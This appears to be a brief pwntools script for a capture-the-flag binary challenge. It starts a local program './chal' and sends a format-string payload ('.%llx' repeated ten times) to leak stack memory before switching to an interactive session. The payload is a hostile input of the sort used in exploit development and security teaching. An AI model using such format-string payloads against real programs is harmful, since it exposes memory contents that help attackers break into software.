from pwn import *
from binascii import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

p.sendline(b".%llx"*10)
p.interactive()
